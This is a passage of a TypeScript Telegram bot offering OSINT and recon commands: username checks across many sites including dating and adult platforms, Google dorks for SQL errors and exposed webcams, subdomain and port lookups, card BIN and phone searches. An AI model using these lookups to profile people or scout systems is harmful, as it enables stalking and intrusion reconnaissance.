        { name: "Imgur", url: `https://imgur.com/user/${username}` },
        { name: "HackTheBox", url: `https://forum.hackthebox.eu/profile/${username}` },
        { name: "TryHackMe", url: `https://tryhackme.com/p/${username}` },
        { name: "Bugcrowd", url: `https://bugcrowd.com/${username}` },
        { name: "HackerOne", url: `https://hackerone.com/${username}` },
        { name: "BuyMeACoffee", url: `https://www.buymeacoffee.com/${username}` },
        { name: "Ko-fi", url: `https://ko-fi.com/${username}` },
        { name: "Snapchat", url: `https://www.snapchat.com/add/${username}` },
        { name: "OkCupid", url: `https://www.okcupid.com/profile/${username}` },
        { name: "Bumble", url: `https://bumble.com/app/profile/${username}` },
        { name: "Tinder", url: `https://tinder.com/@${username}` },
        { name: "VSCO", url: `https://vsco.co/${username}` },
        { name: "Foursquare", url: `https://foursquare.com/${username}` },
        { name: "DeviantArt", url: `https://www.deviantart.com/${username}` },
        { name: "Mixcloud", url: `https://www.mixcloud.com/${username}/` },
        { name: "PornHub", url: `https://www.pornhub.com/users/${username}` },
        { name: "Xvideos", url: `https://www.xvideos.com/profiles/${username}` },
        { name: "OnlyFans", url: `https://onlyfans.com/${username}` },
        { name: "Fansly", url: `https://fansly.com/${username}` },
        { name: "CashApp", url: `https://cash.app/$${username}` },
        // Indo & Forums
        { name: "Kaskus", url: `https://www.kaskus.co.id/profile/${username}` },
        { name: "Kompasiana", url: `https://www.kompasiana.com/${username}` },
        { name: "Blogger", url: `https://${username}.blogspot.com` }
      ];

      // Platforms known to return soft 404s (200 OK but page says not found) or block bots aggressively.
      // We will flag these as "Proteksi/Perlu Cek Manual" to improve accuracy instead of falsely claiming "DITEMUKAN".
      const soft404Platforms = ['Instagram', 'TikTok', 'YouTube', 'Facebook', 'Twitter', 'Snapchat', 'Tinder', 'Bumble', 'OkCupid', 'Spotify'];

      // To avoid overwhelming constraints, process in chunks or concurrently
      const results = await Promise.all(platforms.map(async (platform) => {
        try {
          // Increase accuracy: actually fetch text for some, but fallback to status to avoid huge payload
          const response = await fetchWithTimeout(platform.url, { 
            method: "HEAD",
            headers: {
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
              "Accept": "text/html,application/xhtml+xml"
            }
          }, 4500); // 4.5 seconds timeout
          
          let found = false;
          let status = response.status;
          
          if (status === 200 || status === 301 || status === 302) {
            found = true;
          }

          if (soft404Platforms.includes(platform.name)) {
            // Force these to be manual check / protested because HEAD requests on these almost always yield false positives
            found = false; 
            status = 403; // Simulate blocked
          }

          return { name: platform.name, found, status, url: platform.url };
        } catch (err) {
          return { name: platform.name, found: false, status: "error", url: platform.url };
        }
      }));

      const foundList = results.filter(r => r.found);
      const blockedList = results.filter(r => r.status === 403 || r.status === 429);
      const notFoundList = results.filter(r => !r.found && r.status !== 403 && r.status !== 429);

      let replyText = `🎯 <b>Hasil Scan Digital: @${username}</b>\n\n`;
      
      if (foundList.length > 0) {
        replyText += `🟢 <b>DITEMUKAN (${foundList.length})</b>\n`;
        foundList.forEach(r => replyText += `• <a href="${r.url}">${r.name}</a>\n`);
      } else {
        replyText += `🟢 <b>DITEMUKAN (0)</b>\n`;
      }

      if (blockedList.length > 0) {
        replyText += `\n🟡 <b>PROTEKSI BOT / MINTA CEK MANUAL (${blockedList.length})</b>\n`;
        blockedList.forEach(r => replyText += `• <a href="${r.url}">${r.name}</a> ⚠️\n`);
      }

      replyText += `\n❌ <b>TIDAK DITEMUKAN (${notFoundList.length} platform)</b>\n`;
      if (notFoundList.length > 0) {
        replyText += `<i>Antara lain: ${notFoundList.map(r => r.name).slice(0, 5).join(', ')}...</i>`;
      }

      ctx.reply(replyText, { disable_web_page_preview: true, parse_mode: 'HTML' });
    });

    bot.command('mac', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /mac [xx:xx:xx:xx:xx:xx]");
      try {
        const res = await fetch(`https://api.macvendors.com/${args[1]}`);
        if(res.status === 200) {
          ctx.reply(`🔍 <b>MAC Vendor:</b> ${await res.text()}`, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Tidak ditemukan vendor untuk MAC tersebut (atau rate limited).");
        }
      } catch (e) { ctx.reply("❌ Error fetching MAC info."); }
    });

    bot.command('headers', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if (args.length < 2) return ctx.reply("Format: /headers [url] (misal: https://google.com)");
      let url = args[1];
      if(!url.startsWith('http')) url = 'http://' + url;
      try {
        const res = await fetchWithTimeout(url, { method: 'HEAD' }, 4000);
        let hdrs = '';
        res.headers.forEach((v, k) => hdrs += `${k}: ${v}\n`);
        ctx.reply(`🌐 <b>HTTP Headers:</b>\n<pre>${hdrs.substring(0,3900)}</pre>`, { parse_mode: 'HTML' });
      } catch (e) { ctx.reply("❌ Error fetching headers."); }
    });

    bot.command('dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /dork [keyword]");
      const q = encodeURIComponent(args);
      ctx.reply(`🔍 <b>Google Dorks Generator:</b>\n\n` +
        `• Directory Listing: <a href="https://www.google.com/search?q=intitle:%22index+of%22+${q}">Cari Direktori</a>\n` +
        `• File PDF/DOC: <a href="https://www.google.com/search?q=${q}+filetype:pdf+OR+filetype:doc">Cari Dokumen</a>\n` +
        `• Login Pages: <a href="https://www.google.com/search?q=inurl:login+${q}">Cari Login</a>\n` +
        `• SQL Errors: <a href="https://www.google.com/search?q=${q}+%22you+have+an+error+in+your+sql+syntax%22">SQLi Dork</a>\n` +
        `• Webcams: <a href="https://www.google.com/search?q=inurl:view/view.shtml+${q}">Cari CCTV/Webcam</a>`, {parse_mode: 'HTML', disable_web_page_preview: true});
    });

    bot.command('bininfo', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /bininfo [6 digit awal kartu]");
      try {
        const res = await fetch(`https://data.handyapi.com/bin/${args[1]}`);
        const data = await res.json();
        if(data && data.Status === 'SUCCESS') {
          ctx.reply(`💳 <b>BIN Info:</b>\nScheme: ${data.Scheme}\nType: ${data.Type}\nCard Tier: ${data.CardTier}\nNegara: ${data.Country.Name}\nBank: ${data.Issuer}`, { parse_mode: 'HTML' });
        } else {
          ctx.reply("❌ Data BIN tidak ditemukan.");
        }
      } catch(e) { ctx.reply("❌ Gagal mengecek BIN."); }
    });

    bot.command('subdomain', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /subdomain [domain.com]");
      try {
        ctx.reply("🔍 Sedang mencari subdomain...");
        const res = await fetchWithTimeout(`https://crt.sh/?q=%25.${args[1]}&output=json`, {}, 8000);
        const data = await res.json();
        const subs = [...new Set(data.map((d:any) => d.name_value))].slice(0, 30);
        if(subs.length > 0) {
          ctx.reply(`🌐 <b>Subdomain Ditemukan:</b>\n<pre>${subs.join('\n')}</pre>\n\n<i>(Menampilkan maks 30)</i>`, {parse_mode: 'HTML'});
        } else { ctx.reply("❌ Tidak ada subdomain ditemukan."); }
      } catch(e) { ctx.reply("❌ Gagal mencari subdomain. Server crt.sh lambat."); }
    });

    bot.command('github_user', async (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 2) return ctx.reply("Format: /github_user [username]");
      try {
        const res = await fetch(`https://api.github.com/users/${args[1]}`);
        if(res.status !== 200) return ctx.reply("❌ User tidak ditemukan.");
        const data = await res.json();
        ctx.reply(`🐙 <b>GitHub OSINT:</b>\n\nUsername: ${data.login}\nNama: ${data.name || '-'}\nBio: ${data.bio || '-'}\nLokasi: ${data.location || '-'}\nCompany: ${data.company || '-'}\nBlog: ${data.blog || '-'}\nPublic Repos: ${data.public_repos}\nFollowers: ${data.followers}\nDibuat: ${new Date(data.created_at).toISOString().split('T')[0]}\nURL: ${data.html_url}`, { parse_mode: 'HTML', disable_web_page_preview: true });
      } catch(e) { ctx.reply("❌ Error fetching GitHub data."); }
    });

    bot.command('port', (ctx) => {
      const args = ctx.message.text.split(' ');
      if(args.length < 3) return ctx.reply("Format: /port [ip] [port]");
      const ip = args[1]; const port = parseInt(args[2]);
      const socket = new net.Socket();
      socket.setTimeout(2500);
      let status = "❌ Tertutup / Timeout";
      socket.on('connect', () => { status = "✅ Terbuka"; socket.destroy(); });
      socket.on('timeout', () => { socket.destroy(); });
      socket.on('error', () => { socket.destroy(); });
      socket.on('close', () => {
        ctx.reply(`🔌 <b>Scan Port:</b>\nTarget: <code>${ip}</code>\nPort: <code>${port}</code>\nStatus: ${status}`, { parse_mode: 'HTML' });
      });
      socket.connect(port, ip);
    });

    bot.command('phone_dork', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /phone_dork [nomor_hp] (misal: 0812345...)");
      const numInfo = args.replace(/\D/g, '');
      const numID = numInfo.startsWith('0') ? '62' + numInfo.substring(1) : numInfo;
      ctx.reply(`📱 <b>Phone OSINT Dorks:</b>\n\n` +
        `• Truecaller (Perlu Login): <a href="https://www.truecaller.com/search/global/${numID}">Cari di Truecaller</a>\n` +
        `• GetContact: (Cari via Apps, tidak bisa via web publik)\n` +
        `• WhatsApp Link: <a href="https://wa.me/${numID}">Chat WhatsApp</a>\n` +
        `• Google Dork: <a href="https://www.google.com/search?q=%22${args}%22+OR+%22${numID}%22">Cari Web Jejak Nomor</a>`, {parse_mode: 'HTML', disable_web_page_preview: true});
    });

    bot.command('qr', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /qr [text/url]");
      ctx.replyWithPhoto(`https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(args)}`);
    });

    bot.command('shortlink', async (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if(!args) return ctx.reply("Format: /shortlink [url]");
      let url = args; if(!url.startsWith('http')) url = 'https://' + url;
      try {
        const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}`);
        const data = await res.json();
        ctx.reply(`🔗 Shortlink: ${data.shorturl || "Error"}`);
      } catch(e) { ctx.reply("❌ Error shortening link."); }
    });

    bot.command('pwd', (ctx) => {
      const p = ctx.message.text.split(' ')[1];
      let len = parseInt(p) || 12;
      if(len > 64) len = 64; if(len < 4) len = 4;
      const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+~`|}{[]:;?><,./-=";
      let retVal = "";
      for (let i = 0; i < len; ++i) { retVal += charset.charAt(Math.floor(Math.random() * charset.length)); }
      ctx.reply(`🔑 Password (${len} chars): <code>${retVal}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('b64enc', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64enc [text]");
      ctx.reply(`🔤 Base64 Encode:\n<code>${Buffer.from(args).toString('base64')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('b64dec', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /b64dec [text]");
      try { ctx.reply(`🔤 Base64 Decode:\n<code>${Buffer.from(args, 'base64').toString('utf8')}</code>`, {parse_mode: 'HTML'}); } 
      catch { ctx.reply("❌ Invalid base64"); }
    });

    bot.command('md5', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /md5 [text]");
      ctx.reply(`🔐 MD5:\n<code>${crypto.createHash('md5').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('sha256', (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join(' ');
      if(!args) return ctx.reply("Format: /sha256 [text]");
      ctx.reply(`🔐 SHA256:\n<code>${crypto.createHash('sha256').update(args).digest('hex')}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('uuid', (ctx) => {
      ctx.reply(`🆔 UUID v4:\n<code>${crypto.randomUUID()}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('flip', (ctx) => {
      ctx.reply(`🪙 Hasil lempar koin: <b>${Math.random() > 0.5 ? 'Kepala (Heads)' : 'Ekor (Tails)'}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('roll', (ctx) => {
      const num = Math.floor(Math.random() * 6) + 1;
      ctx.reply(`🎲 Hasil dadu: <b>${num}</b>`, {parse_mode: 'HTML'});
    });

    bot.command('weather', async (ctx) => {
      const args = ctx.message.text.split(' ').slice(1).join('');
      if(!args) return ctx.reply("Format: /weather [kota]");
      try {
        const res = await fetch(`https://wttr.in/${encodeURIComponent(args)}?format=3`);
        ctx.reply(`⛅ <pre>${await res.text()}</pre>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Gagal mendapat info cuaca."); }
    });

    bot.command('crypto_price', async (ctx) => {
       const args = ctx.message.text.split(' ')[1] || 'bitcoin';
       try {
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${args.toLowerCase()}&vs_currencies=usd,idr`);
         const data = await res.json();
         if(data[args.toLowerCase()]) {
            ctx.reply(`🪙 <b>Harga ${args.toUpperCase()}</b>\nUSD: $${data[args.toLowerCase()].usd}\nIDR: Rp${data[args.toLowerCase()].idr.toLocaleString('id-ID')}`, {parse_mode: 'HTML'});
         } else { ctx.reply("❌ Koin tidak ditemukan (Gunakan ID nama penuh, cth: ethereum)."); }
       } catch { ctx.reply("❌ Error fetch market."); }
    });

    bot.command('meme', async (ctx) => {
      try {
        const res = await fetch('https://meme-api.com/gimme');
        const data = await res.json();
        ctx.replyWithPhoto(data.url, { caption: data.title });
      } catch { ctx.reply("❌ Error get meme."); }
    });

    bot.command('joke', async (ctx) => {
      try {
        const res = await fetch('https://official-joke-api.appspot.com/random_joke');
        const data = await res.json();
        ctx.reply(`🤣 <b>${data.setup}</b>\n\n<i>${data.punchline}</i>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get joke."); }
    });

    bot.command('quote', async (ctx) => {
      try {
        const res = await fetch('https://dummyjson.com/quotes/random');
        const data = await res.json();
        ctx.reply(`💭 <i>"${data.quote}"</i>\n- <b>${data.author}</b>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get quote."); }
    });

    bot.command('fact', async (ctx) => {
      try {
        const res = await fetch('https://uselessfacts.jsph.pl/random.json?language=en');
        const data = await res.json();
        ctx.reply(`🧠 <b>Faktanya:</b>\n${data.text}`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Error get fact."); }
    });

    bot.command('cat', async (ctx) => {
      try {
        const res = await fetch('https://api.thecatapi.com/v1/images/search');
        const data = await res.json();
        ctx.replyWithPhoto(data[0].url);
      } catch { ctx.reply("❌ Error get cat."); }
    });

    bot.command('dog', async (ctx) => {
      try {
        const res = await fetch('https://dog.ceo/api/breeds/image/random');
        const data = await res.json();
        ctx.replyWithPhoto(data.message);
      } catch { ctx.reply("❌ Error get dog."); }
    });

    bot.command('morse', (ctx) => {
      const text = ctx.message.text.split(' ').slice(1).join(' ').toUpperCase();
      if(!text) return ctx.reply("Format: /morse [text]");
      const morseCode: Record<string, string> = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '1': '.----', '2': '..---', '3': '...--',
        '4': '....-', '5': '.....', '6': '-....', '7': '--...', '8': '---..',
        '9': '----.', '0': '-----', ' ': '/'
      };
      const res = text.split('').map(c => morseCode[c] || c).join(' ');
      ctx.reply(`📡 <b>Morse:</b>\n<code>${res}</code>`, {parse_mode: 'HTML'});
    });

    bot.command('math', (ctx) => {
      const exp = ctx.message.text.split(' ').slice(1).join(' ');
      if(!exp) return ctx.reply("Format: /math [2+2*3]");
      try {
        // Safe evaluation simulation via limited eval
        if(/[^0-9+\-*/(). ]/.test(exp)) return ctx.reply("❌ Hanya support angka dan operator (+ - * / ( )).");
        // eslint-disable-next-line
        const result = eval(exp);
        ctx.reply(`🧮 <b>Hasil:</b>\n<code>${exp} = ${result}</code>`, {parse_mode: 'HTML'});
      } catch { ctx.reply("❌ Ekspresi matematika error."); }
    });

    let retryCount = 0;
    const launchBot = async () => {
      try {
        const isAIStudio = process.env.VITE_APP_URL && String(process.env.VITE_APP_URL).includes("ais-");
        if (isAIStudio) {
          console.log("🛑 MENCEGAH ERROR 409: Bot dimatikan di AI Studio agar tidak berebut dengan Railway.");
          return;
        }
        await bot.launch({ dropPendingUpdates: true });
        console.log("Telegram bot is running");
      } catch (e: any) {
        if (e && (e.code === 409 || e.response?.error_code === 409)) {
          if (retryCount < 3) {
            retryCount++;
            console.warn(`Telegram Error 409: Conflict detected. (Mungkin bot sedang berjalan di tempat lain). Retrying in 5 seconds... (Attempt ${retryCount}/3)`);
            setTimeout(launchBot, 5000);
          } else {
            console.error("🚨 GAGAL MENJALANKAN BOT: Token bot Telegram ini sedang aktif dan di-host di tempat lain (Misalnya di Deploy Cloud Run atau komputer lokal Anda yang lain). Silakan matikan instance yang lama, atau buat bot baru di BotFather agar token tidak bentrok.");
          }
        } else {
          console.error("Failed to run Telegram Bot:", e);
        }
      }
    };
    launchBot();

    process.once('SIGINT', () => bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
